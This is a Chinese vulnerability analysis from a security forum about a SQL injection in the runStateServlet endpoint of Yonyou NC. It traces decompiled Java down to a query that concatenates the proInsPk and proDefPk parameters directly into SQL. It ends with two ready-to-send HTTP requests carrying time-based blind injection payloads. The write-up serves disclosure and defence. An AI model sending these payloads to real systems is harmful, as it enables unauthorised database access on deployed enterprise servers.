# 用友NC runStateServlet注入漏洞分析

> **来源**: https://forum.butian.net/share/2935  
> **文章ID**: 2935

---

runStateServlet sql注入漏洞
-----------------------

代码路径：C:\\yonyou\\home\\modules\\webimp\\lib\\pubwebimp\_cpwfmLevel-1\\nc\\uap\\wfm\\action\\RunStateServlet.java

![image.png](images/attach-b3d50ed6fdf145a4cda0d97327f0cc586462869d.png)

```java
/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  nc.uap.lfw.core.exception.LfwRuntimeException
 *  nc.uap.lfw.servletplus.annotation.Action
 *  nc.uap.lfw.servletplus.annotation.Servlet
 *  nc.uap.wfm.logger.WfmLogger
 *  nc.vo.jcom.xml.XMLUtil
 *  org.apache.commons.lang.StringUtils
 */
package nc.uap.wfm.action;

import java.io.IOException;
import java.io.PrintWriter;
import java.io.Writer;
import nc.uap.lfw.core.exception.LfwRuntimeException;
import nc.uap.lfw.servletplus.annotation.Action;
import nc.uap.lfw.servletplus.annotation.Servlet;
import nc.uap.wfm.action.WfBaseServlet;
import nc.uap.wfm.logger.WfmLogger;
import nc.uap.wfm.render.FlowImgRender;
import nc.vo.jcom.xml.XMLUtil;
import org.apache.commons.lang.StringUtils;
import org.w3c.dom.Node;

@Servlet(path="/servlet/runStateServlet")
public class RunStateServlet
extends WfBaseServlet {
    private static final long serialVersionUID = -8356983652899198379L;

    @Action(method="POST")
    public void doPost() {
        this.response.setCharacterEncoding("utf-8");
        this.response.setContentType("text/html");
        PrintWriter out = null;
        try {
            out = this.response.getWriter();
        }
        catch (IOException e) {
            WfmLogger.error((String)e.getMessage(), (Throwable)e);
            throw new LfwRuntimeException(e.getMessage());
        }
        String proInsPk = this.request.getParameter("proInsPk");
        String prodefPk = this.request.getParameter("proDefPk");
        if (StringUtils.isNotBlank((String)proInsPk) && !"null".equals(proInsPk) || StringUtils.isNotBlank((String)prodefPk) && !"null".equals(prodefPk)) {
            XMLUtil.printDOMTree((Writer)out, (Node)FlowImgRender.getRenderProcessXml(proInsPk, prodefPk), (int)0, (String)"UTF-8");
            boolean i = false;
        } else {
            out.println();
        }
    }
}

```

从代码中看，proInsPk和proDefPk参数，都进入了getRenderProcessXml方法

```java
 //展示一部代码
    public static Document getRenderProcessXml(String rootProInsPk, String prodefPk) {
        Map<String, Map<String, String>> taskTipMap = getTaskTipMap(rootProInsPk);
        List<Route> routeList = new ArrayList();
        List<Node> nodeList = new ArrayList();
        setNodeListAndRoutList(nodeList, routeList, taskTipMap, rootProInsPk);
        Element xmlNode = null;
        Route route = null;
        Node node = null;
        Document doc = XMLUtil.getNewDocument();
        Element root = doc.createElement("Elements");
        doc.appendChild(root);
        int size = nodeList.size();
        Set<String> idSets = new HashSet();

        for(int i = 0; i < size; ++i) {
            xmlNode = doc.createElement("Node");
            node = (Node)nodeList.get(i);
            idSets.add(node.getId());
            xmlNode.setAttribute("id", node.getId());
            xmlNode.setAttribute("pid", node.getPid());
            xmlNode.setAttribute("isPending", String.valueOf(node.isNotPending()));
            xmlNode.setAttribute("isExe", String.valueOf(node.isNotExe()));
            xmlNode.setAttribute("isPas", String.valueOf(node.isNotPas()));
            xmlNode.setAttribute("isStop", String.valueOf(node.isNotStop()));
            xmlNode.setAttribute("isCntNode", String.valueOf(node.isNotCntNode()));
            xmlNode.setAttribute("isAddSign", String.valueOf(node.isNotAddSign()));
            xmlNode.setAttribute("isBack", String.valueOf(node.isNotReject()));
            xmlNode.setAttribute("tooltip", node.getTooltip());
            root.appendChild(xmlNode);
        }

        ProIns proIns = null;
        ProDef prodef = null;
        if (StringUtils.isNotBlank(rootProInsPk) && !"null".equals(rootProInsPk)) {
            proIns = (ProIns)WfmProinsUtil.getProInsByProInsPk(rootProInsPk);
            prodef = proIns.getProDef();
        } else if (StringUtils.isNotBlank(prodefPk) && !"null".equals(prodefPk)) {
            prodef = (ProDef)WfmProDefUtil.getProDefByProDefPk(prodefPk);
        }

```

![image.png](images/attach-1b2405bd793255714c127a0bce0339534e971b02.png)

proInsPk和proDefPk参数 接着传入了

proIns = (ProIns)WfmProinsUtil.getProInsByProInsPk(rootProInsPk);

prodef = (ProDef)WfmProDefUtil.getProDefByProDefPk(prodefPk)

#### getProInsByProInsPk proInsPk参数注入

![image.png](images/attach-75b8a09f3eea88e8d198c8a710141131d03365a7.png)

`getProInsByProInsPk` 该方法为`WfmProinsUtil`类中实现的

并将参数传入 `WfmEngineUIAdapterFactory.getInstance().getProInsByProinsPk(proInsPk)` 方法中

跟踪`getProInsByProinsPk`

![image.png](images/attach-497e945c068c396aa6ca50e06f979f8deed7be07.png)

发现定义`getProInsByProinsPk`方法的接口类`IWfmEngineUIAdapter`

搜索`getProInsByProinsPk`方法的实现类

在`WfmCpEngineUIAdapter`类中引用了`IWfmEngineUIAdapter`接口类

![image.png](images/attach-45eb6d3e18d343eacd675cde9ec60d0f6abd7c1d.png)

![image.png](images/attach-8eaf6e7135469dee94b3e93eb04ac153bd646c0e.png)

接着跟踪`getProInsByPk`

`proIns = WfmServiceFacility.getProInsQry().getProInsByPk(proInsPk);`

![image.png](images/attach-5b03c996aef4dbde77e6bb849555c7926eb61798.png)

在WfmProInsQry类中实现了getProInsByPk 方法

![image.png](images/attach-d1a84e8d0d5c92d92c4b3d3558b0362a88be84af.png)

WfmProInsVO proInsVO = this.getProInsVOByPk(proInsPk);

接着跟进getProInsVOByPk 方法

![image.png](images/attach-3aba9e3bbfa1067d3402c83decd33be6c7eb2494.png)

将参数传入数据库中查询，并且proInsPk参数可控，造成sql注入漏洞

#### getProDefByProDefPk proDefPk参数注入

跟进 方法 getProDefByProDefPk

![image.png](images/attach-3b73119572e8605cbd0295b5e52e5f15b75df0c6.png)

![image.png](images/attach-3d8f530810cd078355c7b94f730c59d6c179befd.png)

发现定义`getProDefByProDefPk`方法的接口类`IWfmEngineUIAdapter`

搜索`getProDefByProDefPk`方法的实现类

在`WfmCpEngineUIAdapter`类中引用了`IWfmEngineUIAdapter`接口类

![image.png](images/attach-71b7b2632c97e434b03fd8dac5fccb4bdaf6fd57.png)

接着跟进

ProDefsContainer.getByProDefPkAndId((String)prodefPk)

![image.png](images/attach-8c47641f65ad694ce6e1700fbc505271008931a9.png)

![image.png](images/attach-0ae53a853899e3a01fa1179c76dfc8302331a242.png)

接着跟 getProDefVOByProDefPk 方法

![image.png](images/attach-83d3a365bafef212165798b4029e4d84b84c6a4b.png)

在WfmProDefQry类中实现了getProDefVOByProDefPk 方法

```java

public WfmProdefVO getProDefVOByProDefPk(String proDefPk) throws WfmServiceException {
        PtBaseDAO dao = new PtBaseDAO();
        SuperVO[] superVos = null;
        try {
            superVos = dao.queryByCondition(WfmProdefVO.class, "pk_prodef='" + proDefPk + "'");
        }
        catch (DAOException e) {
            WfmLogger.error((String)e.getMessage(), (Throwable)e);
            throw new LfwRuntimeException(e.getMessage());
        }
        if (superVos == null || superVos.length == 0) {
            return null;
        }
        return (WfmProdefVO)superVos[0];
}

```

![image.png](images/attach-d276230549cad0744a9c0e1d4b71a66421099f6e.png)

在代码中看到直接拼接了字符串proDefPk 造成sql注入漏洞

### proInsPk参数

```php
GET /portal/pt/servlet/runStateServlet/doPost?pageId=login&proInsPk=1'waitfor+delay+'0:0:6'-- HTTP/1.1
Host: 192.168.63.129:8088
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 19
```

### proDefPk参数

```php
GET /portal/pt/servlet/runStateServlet/doPost?pageId=login&proDefPk=1'waitfor+delay+'0:0:6'-- HTTP/1.1
Host: 192.168.63.129:8088
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 19
```

![image.png](images/attach-f14989265ef9fdc18674ae3ddc30773ea742c69e.png)

![image.png](images/attach-c6ff58293c5757ef21d25aeff1c28c65dfddbf87.png)

文章首发个人公众号
